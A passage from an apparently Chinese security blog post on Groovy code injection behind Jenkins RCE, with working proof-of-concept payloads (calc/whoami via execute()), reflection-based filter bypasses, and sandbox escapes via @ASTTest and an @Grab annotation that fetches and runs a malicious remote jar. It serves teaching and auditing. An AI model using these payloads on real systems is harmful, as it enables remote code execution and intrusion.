<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GrabResolver</span>(name=<span class="string">'restlet'</span>, root=<span class="string">'http://maven.restlet.org/'</span>)</span><br><span class="line"><span class="meta">@Grab</span>(group=<span class="string">'org.restlet'</span>, module=<span class="string">'org.restlet'</span>, version=<span class="string">'1.1.6'</span>)</span><br><span class="line"><span class="keyword">import</span> org.restlet</span><br></pre></td></tr></table></figure>
<h2 id="0x02-Groovy入门"><a href="#0x02-Groovy入门" class="headerlink" title="0x02 Groovy入门"></a>0x02 Groovy入门</h2><h3 id="Groovy简介"><a href="#Groovy简介" class="headerlink" title="Groovy简介"></a>Groovy简介</h3><p>Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy代码能够与Java代码很好地结合，也能用于扩展现有代码。由于其运行在JVM上的特性，Groovy也可以使用其他非Java语言编写的库。</p>
<p>Groovy是用于Java虚拟机的一种敏捷的动态语言，它是一种成熟的面向对象编程语言，既可以用于面向对象编程，又可以用作纯粹的脚本语言。使用该种语言不必编写过多的代码，同时又具有闭包和动态语言中的其他特性。</p>
<p>Groovy是JVM的一个替代语言（替代是指可以用Groovy在Java平台上进行Java编程），使用方式基本与使用Java代码的方式相同，该语言特别适合与Spring的动态语言支持一起使用，设计时充分考虑了Java集成，这使Groovy与Java代码的互操作很容易。（注意：不是指Groovy替代Java，而是指Groovy和Java很好的结合编程。）</p>
<p>Groovy有以下特点：</p>
<ul>
<li>同时支持静态和动态类型；</li>
<li>支持运算符重载；</li>
<li>本地语法列表和关联数组；</li>
<li>对正则表达式的本地支持；</li>
<li>各种标记语言，如XML和HTML原生支持；</li>
<li>Groovy对于Java开发人员来说很简单，因为Java和Groovy的语法非常相似；</li>
<li>可以使用现有的Java库；</li>
<li>Groovy扩展了java.lang.Object；</li>
</ul>
<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p>参考：<a href="https://www.w3cschool.cn/groovy/" target="_blank" rel="noopener">https://www.w3cschool.cn/groovy/</a></p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载Groovy：<a href="http://groovy-lang.org/download.html" target="_blank" rel="noopener">http://groovy-lang.org/download.html</a></p>
<p>解压之后，使用IDEA新建Groovy项目时选择解压的Groovy目录即可。然后点击src-&gt;new&gt;groovy class，即可新建一个groovy文件，内容如下：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> &#123;</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> main(args)&#123;</span><br><span class="line">        println <span class="string">"Hello World!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="5种运行方式"><a href="#5种运行方式" class="headerlink" title="5种运行方式"></a>5种运行方式</h3><h4 id="groovyConsole图形交互控制台"><a href="#groovyConsole图形交互控制台" class="headerlink" title="groovyConsole图形交互控制台"></a>groovyConsole图形交互控制台</h4><p>在终端下输入<code>groovyConsole</code>启动图形交互控制台，在上面可以直接编写代码执行：</p>
<p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/1.png" alt=""></p>
<h4 id="groovysh-shell命令交互"><a href="#groovysh-shell命令交互" class="headerlink" title="groovysh shell命令交互"></a>groovysh shell命令交互</h4><p>在终端下输入<code>groovysh</code>启动一个shell命令行来执行Groovy代码的交互：</p>
<p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/2.png" alt=""></p>
<h4 id="用命令行执行Groovy脚本"><a href="#用命令行执行Groovy脚本" class="headerlink" title="用命令行执行Groovy脚本"></a>用命令行执行Groovy脚本</h4><p>在GROOVY_HOME\bin里有个叫“groovy”或“groovy.bat”的脚本文件，可以类似<code>python test.py</code>这种方式来执行Groovy脚本。</p>
<p>1.groovy：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">println(<span class="string">"mi1k7ea"</span>)</span><br></pre></td></tr></table></figure>
<p>在Windows运行<code>groovy.bat 1.groovy</code>即可执行该Groovy脚本：</p>
<p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/3.png" alt=""></p>
<h4 id="通过IDE运行Groovy脚本"><a href="#通过IDE运行Groovy脚本" class="headerlink" title="通过IDE运行Groovy脚本"></a>通过IDE运行Groovy脚本</h4><p>有一个叫GroovyShell的类含有main(String[])方法可以运行任何Groovy脚本。</p>
<p>在前面的IDEA中可以直接运行Groovy脚本：</p>
<p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/4.png" alt=""></p>
<p>当然，也可以在Java环境中通过groovy-all.jar中的groovy.lang.GroovyShell类来运行Groovy脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp groovy-all-2.4.12.jar groovy.lang.GroovyShell 1.groovy</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/5.png" alt=""></p>
<h4 id="用Groovy创建Unix脚本"><a href="#用Groovy创建Unix脚本" class="headerlink" title="用Groovy创建Unix脚本"></a>用Groovy创建Unix脚本</h4><p>你可以用Groovy编写Unix脚本并且像Unix脚本一样直接从命令行运行它.倘若你安装的是二进制分发包并且设置好环境变量,那么下面的代码将会很好的工作。</p>
<p>编写一个类似如下的脚本文件，保存为：HelloGroovy</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env groovy</span></span><br><span class="line">println(<span class="string">"this is groovy script"</span>)</span><br><span class="line">println(<span class="string">"Hi,"</span>+args[<span class="number">0</span>]+<span class="string">" welcome to Groovy"</span>)</span><br></pre></td></tr></table></figure>
<p>然后在命令行下执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ chmod +x HelloGroovy</span><br><span class="line">$ ./HelloGroovy micmiu.com</span><br><span class="line">this is groovy script</span><br><span class="line">Hi,micmiu.com welcome to Groovy</span><br></pre></td></tr></table></figure>
<h2 id="0x03-Groovy代码注入"><a href="#0x03-Groovy代码注入" class="headerlink" title="0x03 Groovy代码注入"></a>0x03 Groovy代码注入</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>我们知道，Groovy是一种强大的编程语言，其强大的功能包括了危险的命令执行等调用。</p>
<p>在目标服务中，如果外部可控输入Groovy代码或者外部可上传一个恶意的Groovy脚本，且程序并未对输入的Groovy代码进行有效的过滤，那么会导致恶意的Groovy代码注入，从而RCE。</p>
<p>如下代码简单地执行命令：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> &#123;</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> main(args)&#123;</span><br><span class="line">        <span class="keyword">def</span> cmd = <span class="string">"calc"</span>;</span><br><span class="line">        println <span class="string">"$&#123;cmd.execute()&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段Groovy代码被执行就会弹计算器：</p>
<p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/6.png" alt=""></p>
<h3 id="几种PoC变通形式"><a href="#几种PoC变通形式" class="headerlink" title="几种PoC变通形式"></a>几种PoC变通形式</h3><p>Groovy代码注入实现命令执行有以下几种变通的形式：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 直接命令执行</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"calc"</span>)</span><br><span class="line"><span class="string">"calc"</span>.execute()</span><br><span class="line"><span class="string">'calc'</span>.execute()</span><br><span class="line"><span class="string">"$&#123;"</span>calc<span class="string">".execute()&#125;"</span></span><br><span class="line"><span class="string">"$&#123;'calc'.execute()&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回显型命令执行</span></span><br><span class="line">println <span class="string">"whoami"</span>.execute().text</span><br><span class="line">println <span class="string">'whoami'</span>.execute().text</span><br><span class="line">println <span class="string">"$&#123;"</span>whoami<span class="string">".execute().text&#125;"</span></span><br><span class="line">println <span class="string">"$&#123;'whoami'.execute().text&#125;"</span></span><br><span class="line"><span class="keyword">def</span> cmd = <span class="string">"whoami"</span>;</span><br><span class="line">println <span class="string">"$&#123;cmd.execute().text&#125;"</span>;</span><br></pre></td></tr></table></figure>
<h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p>在下面一些场景中，会触发Groovy代码注入漏洞。</p>
<h4 id="GroovyShell"><a href="#GroovyShell" class="headerlink" title="GroovyShell"></a>GroovyShell</h4><p>GroovyShell允许在Java类中（甚至Groovy类）解析任意Groovy表达式的值。</p>
<p>GroovyShellExample.java：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.GroovyShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyShellExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> </span>&#123;</span><br><span class="line">        GroovyShell groovyShell = <span class="keyword">new</span> GroovyShell();</span><br><span class="line">        groovyShell.evaluate(<span class="string">"\"calc\".execute()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接运行即可弹计算器：</p>
<p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/7.png" alt=""></p>
<p>或者换成运行Groovy脚本的方式也是也一样的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.GroovyShell;</span><br><span class="line"><span class="keyword">import</span> groovy.lang.Script;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyShellExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GroovyShell groovyShell = <span class="keyword">new</span> GroovyShell();</span><br><span class="line">        Script script = groovyShell.parse(<span class="keyword">new</span> File(<span class="string">"src/test.groovy"</span>));</span><br><span class="line">        script.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>test.groovy：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">println <span class="string">"whoami"</span>.execute().text</span><br></pre></td></tr></table></figure>
<p>此外，可使用Binding对象输入参数给表达式，并最终通过GroovyShell返回Groovy表达式的计算结果。</p>
<h4 id="GroovyScriptEngine"><a href="#GroovyScriptEngine" class="headerlink" title="GroovyScriptEngine"></a>GroovyScriptEngine</h4><p>GroovyScriptEngine可从指定的位置（文件系统、URL、数据库等等）加载Groovy脚本，并且随着脚本变化而重新加载它们。如同GroovyShell一样，GroovyScriptEngine也允许传入参数值，并能返回脚本的计算值。</p>
<p>GroovyScriptEngineExample.java，直接运行即加载Groovy脚本文件实现命令执行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.Binding;</span><br><span class="line"><span class="keyword">import</span> groovy.util.GroovyScriptEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyScriptEngineExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GroovyScriptEngine groovyScriptEngine = <span class="keyword">new</span> GroovyScriptEngine(<span class="string">""</span>);</span><br><span class="line">        groovyScriptEngine.run(<span class="string">"src/test.groovy"</span>,<span class="keyword">new</span> Binding());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>test.groovy脚本文件如之前。</p>
<h4 id="GroovyClassLoader"><a href="#GroovyClassLoader" class="headerlink" title="GroovyClassLoader"></a>GroovyClassLoader</h4><p>GroovyClassLoader是一个定制的类装载器，负责解释加载Java类中用到的Groovy类。</p>
<p>GroovyClassLoaderExample.java，直接运行即加载Groovy脚本文件实现命令执行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> groovy.lang.GroovyClassLoader;</span><br><span class="line"><span class="keyword">import</span> groovy.lang.GroovyObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GroovyClassLoaderExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GroovyClassLoader groovyClassLoader = <span class="keyword">new</span> GroovyClassLoader();</span><br><span class="line">        Class loadClass = groovyClassLoader.parseClass(<span class="keyword">new</span> File(<span class="string">"src/test.groovy"</span>));</span><br><span class="line">        GroovyObject groovyObject = (GroovyObject) loadClass.newInstance();</span><br><span class="line">        groovyObject.invokeMethod(<span class="string">"main"</span>,<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>test.groovy脚本文件如之前。</p>
<h4 id="ScriptEngine"><a href="#ScriptEngine" class="headerlink" title="ScriptEngine"></a>ScriptEngine</h4><p>ScriptEngine脚本引擎是被设计为用于数据交换和脚本执行的。</p>
<ul>
<li>数据交换：表现在调度引擎的时候，允许将数据输入/输出引擎，至于引擎内的数据持有的具体方式有两种：普通的键值对和Bindings（interface Bindings extends Map&lt;String,Object&gt;）；</li>
<li>脚本执行：脚本引擎执行表现为调用eval()；</li>
</ul>
<p>ScriptEngineManager类是一个脚本引擎的管理类，用来创建脚本引擎，大概的方式就是在类加载的时候通过SPI的方式，扫描ClassPath中已经包含实现的所有ScriptEngineFactory，载入后用来负责生成具体的ScriptEngine。</p>
<p>在ScriptEngine中，支持名为“groovy”的引擎，可用来执行Groovy代码。这点和在SpEL表达式注入漏洞中讲到的同样是利用ScriptEngine支持JS引擎从而实现绕过达到RCE是一样的。</p>
<p>ScriptEngineExample.java，直接运行即命令执行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScriptEngineExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ScriptEngine groovyEngine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span class="string">"groovy"</span>);</span><br><span class="line">        groovyEngine.eval(<span class="string">"\"calc\".execute()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行Groovy脚本，需要实现读取文件内容的接口而不能直接传入File类对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScriptEngineExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ScriptEngine groovyEngine = <span class="keyword">new</span> ScriptEngineManager().getEngineByName(<span class="string">"groovy"</span>);</span><br><span class="line">        String code = readfile(<span class="string">"src/test.groovy"</span>);</span><br><span class="line">        groovyEngine.eval(code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readfile</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(filename));</span><br><span class="line">        String string = <span class="string">""</span>;</span><br><span class="line">        String str;</span><br><span class="line">        <span class="keyword">while</span> ((str = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            string = string + str;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>test.groovy脚本文件如之前。</p>
<h2 id="0x04-Bypass-Tricks"><a href="#0x04-Bypass-Tricks" class="headerlink" title="0x04 Bypass Tricks"></a>0x04 Bypass Tricks</h2><h3 id="利用反射机制和字符串拼接Bypass"><a href="#利用反射机制和字符串拼接Bypass" class="headerlink" title="利用反射机制和字符串拼接Bypass"></a>利用反射机制和字符串拼接Bypass</h3><p>直接的命令执行在前面已经说过几种形式了：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 直接命令执行</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"calc"</span>)</span><br><span class="line"><span class="string">"calc"</span>.execute()</span><br><span class="line"><span class="string">'calc'</span>.execute()</span><br><span class="line"><span class="string">"$&#123;"</span>calc<span class="string">".execute()&#125;"</span></span><br><span class="line"><span class="string">"$&#123;'calc'.execute()&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回显型命令执行</span></span><br><span class="line">println <span class="string">"whoami"</span>.execute().text</span><br><span class="line">println <span class="string">'whoami'</span>.execute().text</span><br><span class="line">println <span class="string">"$&#123;"</span>whoami<span class="string">".execute().text&#125;"</span></span><br><span class="line">println <span class="string">"$&#123;'whoami'.execute().text&#125;"</span></span><br><span class="line"><span class="keyword">def</span> cmd = <span class="string">"whoami"</span>;</span><br><span class="line">println <span class="string">"$&#123;cmd.execute().text&#125;"</span>;</span><br></pre></td></tr></table></figure>
<p>在某些场景下，程序可能会过滤输入内容，此时可以通过反射机制以及字符串拼接的方式来绕过实现命令执行：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line">Class&lt;?&gt; rt = Class.forName("java.la" + "ng.Run" + "time");</span><br><span class="line">Method gr = rt.getMethod("getR" + "untime");</span><br><span class="line">Method ex = rt.getMethod("ex" + "ec", String.class);</span><br><span class="line">ex.invoke(gr.invoke(null), "ca" + "lc")</span><br></pre></td></tr></table></figure>
<h3 id="Groovy沙箱Bypass"><a href="#Groovy沙箱Bypass" class="headerlink" title="Groovy沙箱Bypass"></a>Groovy沙箱Bypass</h3><p>前面说到的Groovy代码注入都是注入了execute()函数，从而能够成功执行Groovy代码，这是因为不是在Jenkins中执行即没有Groovy沙箱的限制。但是在存在Groovy沙箱即只进行AST解析无调用或限制execute()函数的情况下就需要用到其他技巧了。这也是Orange大佬在绕过Groovy沙箱时用到的技巧。</p>
<h4 id="AST注解执行断言"><a href="#AST注解执行断言" class="headerlink" title="@AST注解执行断言"></a>@AST注解执行断言</h4><p>参考Groovy的<a href="http://groovy-lang.org/metaprogramming.html" target="_blank" rel="noopener">Meta Programming手册</a>，利用AST注解能够执行断言从而实现代码执行（本地测试无需assert也能触发代码执行）。</p>
<p>PoC：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.<span class="keyword">class</span>.classLoader.parseClass(<span class="string">'''</span></span><br><span class="line"><span class="string">    @groovy.transform.ASTTest(value=&#123;</span></span><br><span class="line"><span class="string">        assert Runtime.getRuntime().exec("calc")</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">    def x</span></span><br><span class="line"><span class="string">'''</span>);</span><br></pre></td></tr></table></figure>
<p>本地测试：</p>
<p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/12.png" alt=""></p>
<h4 id="Grab注解加载远程恶意类"><a href="#Grab注解加载远程恶意类" class="headerlink" title="@Grab注解加载远程恶意类"></a>@Grab注解加载远程恶意类</h4><p>@Grab注解的详细用法在<a href="http://docs.groovy-lang.org/latest/html/documentation/grape.html" target="_blank" rel="noopener">Dependency management with Grape</a>中有讲到，简单地说，Grape是Groovy内建的一个动态Jar依赖管理程序，允许开发者动态引入不在ClassPath中的函式库。</p>
<p>编写恶意Exp类，命令执行代码写在其构造函数中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123; &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>依次运行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac Exp.java</span><br><span class="line">mkdir -p META-INF/services/</span><br><span class="line"><span class="built_in">echo</span> Exp &gt; META-INF/services/org.codehaus.groovy.plugins.Runners</span><br><span class="line">jar cvf poc-0.jar Exp.class META-INF</span><br></pre></td></tr></table></figure>
<p>先在Web根目录中新建<code>/test/poc/0/</code>目录，然后复制该jar包到该子目录下，接着开始HTTP服务。</p>
<p>PoC：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.<span class="keyword">class</span>.classLoader.parseClass(<span class="string">'''</span></span><br><span class="line"><span class="string">    @GrabConfig(disableChecksums=true)</span></span><br><span class="line"><span class="string">    @GrabResolver(name='Exp', root='http://127.0.0.1:8000/')</span></span><br><span class="line"><span class="string">    @Grab(group='test', module='poc', version='0')</span></span><br><span class="line"><span class="string">    import Exp;</span></span><br><span class="line"><span class="string">'''</span>)</span><br></pre></td></tr></table></figure>
<p>运行，成功请求远程恶意Jar包并导入恶意Exp类执行其构造函数，从而导致RCE：</p>
<p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/13.png" alt=""></p>
<h2 id="0x05-排查方法"><a href="#0x05-排查方法" class="headerlink" title="0x05 排查方法"></a>0x05 排查方法</h2><p>排查关键类函数特征：</p>
<table>
<thead>
<tr>
<th>关键类</th>
<th>关键函数</th>
</tr>
</thead>
<tbody>
<tr>
<td>groovy.lang.GroovyShell</td>
<td>evaluate</td>
</tr>
<tr>
<td>groovy.util.GroovyScriptEngine</td>
<td>run</td>
</tr>
<tr>
<td>groovy.lang.GroovyClassLoader</td>
<td>parseClass</td>
</tr>
<tr>
<td>javax.script.ScriptEngine</td>
<td>eval</td>
</tr>
</tbody>
</table>
<h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="http://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html" target="_blank" rel="noopener">Hacking Jenkins Part 1 - Play with Dynamic Routing</a></p>
<p><a href="http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html" target="_blank" rel="noopener">Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!</a></p>
<p><a href="https://www.anquanke.com/post/id/172796" target="_blank" rel="noopener">Jenkins RCE分析（CVE-2018-1000861分析）</a></p>
<p><a href="https://xz.aliyun.com/t/6372" target="_blank" rel="noopener">Jenkins groovy scripts for read teamers and penetration testers</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Java</tag>
        <tag>Jenkins</tag>
        <tag>Groovy</tag>
      </tags>
  </entry>
</search>
